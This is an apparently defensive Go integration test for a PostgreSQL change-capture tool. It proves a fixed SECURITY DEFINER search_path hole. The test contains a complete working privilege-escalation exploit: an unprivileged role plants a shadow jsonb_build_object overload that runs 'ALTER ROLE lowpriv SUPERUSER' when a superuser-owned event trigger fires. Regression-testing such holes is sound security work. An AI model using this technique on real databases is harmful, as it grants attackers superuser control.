//go:build integration

// Copyright 2026 Omar Ramos
// SPDX-License-Identifier: Apache-2.0

// SEC-1 (audit 2026-08-31) — the privilege-escalation pins, against real PG.
//
// From v0.85.0 through v0.134.0 the DDL capture function shipped as
// SECURITY DEFINER with NO `SET search_path`. `CREATE EVENT TRIGGER`
// requires superuser, so that function is superuser-owned, and an unpinned
// definer resolves unqualified calls against the FIRING session's
// search_path — the session of whoever ran the DDL. This file is the
// load-bearing proof, not a shape assertion: it plants an attacker-typed
// `jsonb_build_object(text,text,text,text)` overload as an UNPRIVILEGED
// role and fires one `CREATE TABLE`, asserting the shadow executes as the
// superuser against the PRE-fix function and does NOT against the shipped
// one.
//
// Why the overload wins at all: the built-in's signature is
// `VARIADIC "any"`, which scores ZERO exact argument-type matches in
// PostgreSQL's function-resolution ranking; the attacker's exact-typed
// candidate scores two. Schema order — including pg_catalog's implicit
// first position — is only consulted for candidates with IDENTICAL
// signatures, so a better match beats it.

package pgtrigger

import (
	"context"
	"database/sql"
	"strings"
	"testing"
	"time"
)

// preFixCaptureDDLFunction reconstructs the EXACT shape v0.85.0–v0.134.0
// shipped, by reversing the two halves of the SEC-1 fix on the current
// renderer's output: drop the search_path clause, drop every pg_catalog
// qualification. Deriving it (rather than pasting a frozen copy) keeps the
// pre-fix fixture honest as the body evolves — and, per the fixture rule in
// CLAUDE.md, this fixture is what an OLDER binary would have produced, not
// a post-change value dressed up as one.
func preFixCaptureDDLFunction(t *testing.T, schema, changeLogTableRef string) string {
	t.Helper()
	fn := renderCaptureDDLFunction(schema, changeLogTableRef)
	stripped := strings.Replace(fn, "\nSET search_path = pg_catalog, pg_temp", "", 1)
	if stripped == fn {
		t.Fatalf("pre-fix fixture: the search_path clause was not found to strip — the reversal no longer "+
			"reproduces the pre-fix shape and this whole file would test the fixed function twice:\n%s", fn)
	}
	unqualified := strings.ReplaceAll(stripped, "pg_catalog.", "")
	if unqualified == stripped {
		t.Fatalf("pre-fix fixture: no pg_catalog. qualifications were found to strip:\n%s", stripped)
	}
	return unqualified
}

// pinnedButUnqualifiedDDLFunction is the fixed function with ONLY the
// pg_catalog qualification removed — the shape the two sibling capture
// functions had before this fix (pinned search_path, bare calls). Used to
// isolate whether `SET search_path = pg_catalog, pg_temp` is sufficient on
// its own against a pg_temp-planted overload, which is the premise the
// siblings rested on for their whole shipped life.
func pinnedButUnqualifiedDDLFunction(t *testing.T, schema, changeLogTableRef string) string {
	t.Helper()
	fn := renderCaptureDDLFunction(schema, changeLogTableRef)
	out := strings.ReplaceAll(fn, "pg_catalog.", "")
	// The SET clause itself spells `pg_catalog,` (comma, not dot), so it
	// survives the strip; assert that rather than trusting it.
	if !strings.Contains(out, "SET search_path = pg_catalog, pg_temp") {
		t.Fatalf("pinned-but-unqualified fixture lost its search_path pin:\n%s", out)
	}
	return out
}

// applyPGSQLAs runs a script through a dedicated connection as `user`.
// The multi-statement scripts here ride pgx's simple protocol (no bind
// args), which keeps `SET search_path` and the DDL that follows it on ONE
// session — load-bearing for the pg_temp case, where the planted overload
// lives in the caller's own temp namespace.
func applyPGSQLAs(t *testing.T, dsn, user, password, sqlText string) error {
	t.Helper()
	asUser := strings.Replace(dsn, "://test:test@", "://"+user+":"+password+"@", 1)
	if asUser == dsn {
		t.Fatalf("could not rewrite the DSN credentials to %q (container helper changed shape?)", user)
	}
	db, err := sql.Open("pgx", asUser)
	if err != nil {
		t.Fatalf("open as %s: %v", user, err)
	}
	defer func() { _ = db.Close() }()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	_, err = db.ExecContext(ctx, sqlText)
	return err
}

// TestDDLCaptureFunctionSearchPath_ShadowedBuiltin is the exploitation pin.
// One container, one attacker role, three installed shapes of the same
// function, each fired by the same unprivileged CREATE TABLE.
func TestDDLCaptureFunctionSearchPath_ShadowedBuiltin(t *testing.T) {
	dsn, cleanup := startPGForTrigger(t)
	defer cleanup()

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	applyPGSQL(t, dsn, `CREATE TABLE sec1_t (id BIGINT PRIMARY KEY, v TEXT)`)
	if _, err := Setup(ctx, dsn, SetupOptions{Tables: []string{"sec1_t"}}); err != nil {
		t.Fatalf("Setup: %v", err)
	}

	db, err := sql.Open("pgx", dsn)
	if err != nil {
		t.Fatalf("open: %v", err)
	}
	defer func() { _ = db.Close() }()

	// The attacker: an ordinary LOGIN role with a schema of its own. It is
	// given no privilege beyond CREATE on that schema and write access to
	// the observation table — deliberately NOT superuser, NOT the table
	// owner, and not a member of any predefined role.
	applyPGSQL(t, dsn, `
CREATE TABLE sec1_pwned (whoami TEXT, is_superuser TEXT, escalation TEXT);
CREATE ROLE lowpriv LOGIN PASSWORD 'lowpriv';
CREATE SCHEMA lowpriv AUTHORIZATION lowpriv;
GRANT INSERT, SELECT, DELETE ON sec1_pwned TO lowpriv;
`)

	// The shadow. Its body records the identity it executes under and
	// attempts the definitive escalation (ALTER ROLE … SUPERUSER, which
	// `lowpriv` cannot run itself). SECURITY INVOKER, so when the
	// superuser-owned capture function calls it, it inherits that context.
	const shadowBody = `
CREATE FUNCTION %SCHEMA%.jsonb_build_object(text, text, text, text) RETURNS jsonb
LANGUAGE plpgsql AS $shadow$
DECLARE
    outcome TEXT;
BEGIN
    BEGIN
        EXECUTE 'ALTER ROLE lowpriv SUPERUSER';
        outcome := 'ALTER ROLE lowpriv SUPERUSER SUCCEEDED';
    EXCEPTION WHEN OTHERS THEN
        outcome := 'ALTER ROLE refused: ' || SQLERRM;
    END;
    INSERT INTO public.sec1_pwned(whoami, is_superuser, escalation)
    VALUES (current_user, current_setting('is_superuser'), outcome);
    RETURN '{}'::jsonb;
END
$shadow$;`

	if err := applyPGSQLAs(t, dsn, "lowpriv", "lowpriv",
		strings.ReplaceAll(shadowBody, "%SCHEMA%", "lowpriv")); err != nil {
		t.Fatalf("plant shadow overload as lowpriv: %v", err)
	}

	installFn := func(t *testing.T, ddl string) {
		t.Helper()
		if _, err := db.ExecContext(ctx, ddl); err != nil {
			t.Fatalf("install capture-DDL function: %v", err)
		}
	}
	resetObservations := func(t *testing.T) {
		t.Helper()
		if _, err := db.ExecContext(ctx, `DELETE FROM sec1_pwned`); err != nil {
			t.Fatalf("reset observations: %v", err)
		}
	}
	// fireDDL runs one CREATE TABLE as lowpriv with the attacker's schema
	// first on the search_path — the whole exploit input.
	fireDDL := func(t *testing.T, table, pathSchema string) {
		t.Helper()
		script := "SET search_path = " + pathSchema + ", public;\nCREATE TABLE lowpriv." + table + " (id int);"
		if err := applyPGSQLAs(t, dsn, "lowpriv", "lowpriv", script); err != nil {
			t.Fatalf("fire DDL as lowpriv: %v", err)
		}
	}
	observations := func(t *testing.T) []string {
		t.Helper()
		rows, err := db.QueryContext(ctx, `SELECT whoami || ' / is_superuser=' || is_superuser || ' / ' || escalation FROM sec1_pwned`)
		if err != nil {
			t.Fatalf("read observations: %v", err)
		}
		defer func() { _ = rows.Close() }()
		var out []string
		for rows.Next() {
			var s string
			if err := rows.Scan(&s); err != nil {
				t.Fatalf("scan observation: %v", err)
			}
			out = append(out, s)
		}
		if err := rows.Err(); err != nil {
			t.Fatalf("observations: %v", err)
		}
		return out
	}
	lowprivIsSuperuser := func(t *testing.T) bool {
		t.Helper()
		var b bool
		if err := db.QueryRowContext(ctx, `SELECT rolsuper FROM pg_roles WHERE rolname = 'lowpriv'`).Scan(&b); err != nil {
			t.Fatalf("read rolsuper: %v", err)
		}
		return b
	}
	dropSuperuser := func(t *testing.T) {
		t.Helper()
		if _, err := db.ExecContext(ctx, `ALTER ROLE lowpriv NOSUPERUSER`); err != nil {
			t.Fatalf("reset lowpriv: %v", err)
		}
	}

	changeLogRef := `"public"."` + ChangeLogTable + `"`

	t.Run("PRE-fix shape: the shadow FIRES as the superuser owner", func(t *testing.T) {
		installFn(t, preFixCaptureDDLFunction(t, "public", changeLogRef))
		resetObservations(t)

		fireDDL(t, "pre_fix_tbl", "lowpriv")

		got := observations(t)
		if len(got) == 0 {
			t.Fatalf("the attacker's jsonb_build_object overload did NOT fire against the PRE-fix (unpinned, " +
				"unqualified) function. Either PostgreSQL's resolution does not prefer the exact-typed candidate " +
				"here, or the fixture no longer reproduces the pre-fix shape — do NOT read this as 'the " +
				"vulnerability is not exploitable' without re-deriving why")
		}
		t.Logf("PRE-fix observations: %v", got)
		for _, o := range got {
			if !strings.Contains(o, "test /") {
				t.Errorf("shadow ran as %q, expected the function's superuser owner (test)", o)
			}
		}
		if !lowprivIsSuperuser(t) {
			t.Errorf("shadow fired but ALTER ROLE lowpriv SUPERUSER did not take effect: %v", got)
		}
		dropSuperuser(t)
	})

	t.Run("SHIPPED shape: the shadow does NOT fire, and capture still works", func(t *testing.T) {
		installFn(t, renderCaptureDDLFunction("public", changeLogRef))
		resetObservations(t)

		fireDDL(t, "post_fix_tbl", "lowpriv")

		if got := observations(t); len(got) != 0 {
			t.Fatalf("the shadow STILL fired against the fixed function — the SEC-1 fix does not hold: %v", got)
		}
		if lowprivIsSuperuser(t) {
			t.Fatalf("lowpriv became superuser against the fixed function")
		}
		// The independent expected value for "the function still works":
		// the change log's own op='X' row for the DDL just fired, read
		// from the database rather than inferred from the absence of an
		// exploit. A fix that broke capture would otherwise pass here.
		var n int
		if err := db.QueryRowContext(ctx,
			`SELECT count(*) FROM sluice_change_log WHERE op = 'X' AND table_name LIKE '%post_fix_tbl%'`).Scan(&n); err != nil {
			t.Fatalf("count X rows: %v", err)
		}
		if n == 0 {
			t.Errorf("the fixed function recorded no op='X' row for the DDL it just saw — the qualification broke capture")
		}
	})

	t.Run("PREMISE: search_path pin alone, against a pg_temp-planted overload", func(t *testing.T) {
		// The siblings ([renderCaptureRowFunction], [renderCaptureTruncateFunction])
		// rested on the pin alone for their entire shipped life, and
		// PostgreSQL's own guidance calls `… , pg_temp` the secure
		// arrangement. pg_temp is the one schema in that path an
		// unprivileged caller can write, and the definer runs inside the
		// CALLER's session, so the caller's temp namespace is the one in
		// scope. This sub-test establishes what the pin alone is actually
		// worth rather than assuming it (the premise-naming step).
		installFn(t, pinnedButUnqualifiedDDLFunction(t, "public", changeLogRef))
		resetObservations(t)

		// Plant + fire in ONE session: a temp function lives only for the
		// session that created it.
		script := strings.ReplaceAll(shadowBody, "%SCHEMA%", "pg_temp") +
			"\nCREATE TABLE lowpriv.temp_shadow_tbl (id int);"
		if err := applyPGSQLAs(t, dsn, "lowpriv", "lowpriv", script); err != nil {
			t.Fatalf("plant pg_temp overload + fire DDL as lowpriv: %v", err)
		}

		// Anti-vacuity: prove the event trigger actually FIRED for this
		// DDL before reading anything into the absence of an observation.
		var fired int
		if err := db.QueryRowContext(ctx,
			`SELECT count(*) FROM sluice_change_log WHERE op = 'X' AND table_name LIKE '%temp_shadow_tbl%'`).Scan(&fired); err != nil {
			t.Fatalf("count X rows: %v", err)
		}
		if fired == 0 {
			t.Fatalf("the capture function never ran for this DDL — a clean result here would mean nothing")
		}

		got := observations(t)
		super := lowprivIsSuperuser(t)
		if super {
			dropSuperuser(t)
		}
		if len(got) != 0 || super {
			t.Errorf("PREMISE FALSIFIED: a pg_temp-planted overload defeated `SET search_path = pg_catalog, pg_temp` "+
				"(observations=%v, lowpriv superuser=%t). The pin is NOT sufficient on its own — the pg_catalog "+
				"qualification the shipped functions now carry is the belt that holds, and any future SECURITY "+
				"DEFINER emitter MUST qualify its body, not merely pin the path", got, super)
		} else {
			t.Logf("pin-alone HELD: the pg_temp-planted overload did not win resolution (observed on PG 16 — " +
				"PostgreSQL does not resolve FUNCTION names in the temporary schema, only relation and type " +
				"names), so the two sibling capture functions were never exposed by resting on the pin. The " +
				"shipped functions carry the pg_catalog qualification regardless, and this assertion is what " +
				"turns that sentence from a claim into a checked premise")
		}
	})
}

// TestInsecureCaptureFunctionWarn_AtCDCOpen pins the upgrade door in BOTH
// directions against real PG: an install carrying the pre-fix function
// WARNs at every CDC open naming the remedy, a freshly-set-up install does
// not, and running the named remedy actually clears it.
func TestInsecureCaptureFunctionWarn_AtCDCOpen(t *testing.T) {
	dsn, cleanup := startPGForTrigger(t)
	defer cleanup()

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	applyPGSQL(t, dsn, `CREATE TABLE sec1_warn_t (id BIGINT PRIMARY KEY, v TEXT)`)
	if _, err := Setup(ctx, dsn, SetupOptions{Tables: []string{"sec1_warn_t"}}); err != nil {
		t.Fatalf("Setup: %v", err)
	}

	openAndCaptureLogs := func(t *testing.T) string {
		t.Helper()
		return captureWarnLogs(t, func() {
			r, err := openCDCReader(ctx, dsn, "")
			if err != nil {
				t.Fatalf("openCDCReader: %v", err)
			}
			_ = r.(*CDCReader).Close()
		})
	}

	t.Run("fresh install: no INSECURE-CAPTURE-FUNCTION warn (no false alarm)", func(t *testing.T) {
		if logs := openAndCaptureLogs(t); strings.Contains(logs, insecureDefinerMarker) {
			t.Fatalf("%s warned on a freshly-installed source (false alarm):\n%s", insecureDefinerMarker, logs)
		}
	})

	t.Run("pre-fix install: WARN fires naming the function and the remedy", func(t *testing.T) {
		applyPGSQL(t, dsn, preFixCaptureDDLFunction(t, "public", `"public"."`+ChangeLogTable+`"`))

		logs := openAndCaptureLogs(t)
		if !strings.Contains(logs, insecureDefinerMarker) {
			t.Fatalf("a CDC open over the vulnerable pre-fix function did not WARN with %s:\n%s",
				insecureDefinerMarker, logs)
		}
		for _, want := range []string{CaptureFunctionDDL, "SUPERUSER", "trigger setup"} {
			if !strings.Contains(logs, want) {
				t.Errorf("WARN missing %q; logs:\n%s", want, logs)
			}
		}
		// Only the DDL function is named — the siblings ship pinned, and a
		// door that named them here would be crying wolf.
		if strings.Contains(logs, CaptureFunctionRow) {
			t.Errorf("WARN named the row capture function, which carries the pin:\n%s", logs)
		}
	})

	t.Run("the named remedy clears it: a trigger setup re-run", func(t *testing.T) {
		if _, err := Setup(ctx, dsn, SetupOptions{Tables: []string{"sec1_warn_t"}}); err != nil {
			t.Fatalf("Setup re-run: %v", err)
		}
		if logs := openAndCaptureLogs(t); strings.Contains(logs, insecureDefinerMarker) {
			t.Fatalf("the remedy the WARN names (`sluice trigger setup` re-run) did not clear it — an operator "+
				"following the hint would be told the same thing forever:\n%s", logs)
		}
	})
}
